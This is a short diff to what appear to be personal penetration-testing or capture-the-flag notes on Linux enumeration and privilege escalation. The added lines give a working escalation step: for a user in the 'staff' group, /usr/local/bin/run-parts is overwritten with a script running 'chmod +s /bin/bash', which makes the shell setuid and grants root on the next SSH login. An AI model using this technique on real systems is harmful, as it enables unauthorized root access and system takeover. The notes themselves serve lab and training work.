@@ -5,5 +5,16 @@ b) netstat -tulpn (google search what is on those ports)
   and go at the browser locasion--> http://localhost:3000/
 watch the gitea version and search for exploit!
   or ss -tuln
+c) id
+  1. if there is "Staff" then:
+    echo $PATH
+    which run-parts
+    nano /usr/local/bin/run-parts
+          #!/bin/bash
+          chmod +s /bin/bash
+    chmod +x /usr/local/bin/run-parts
+    id
+    and then try ssh again!
+d) 
 
 WINDOWS
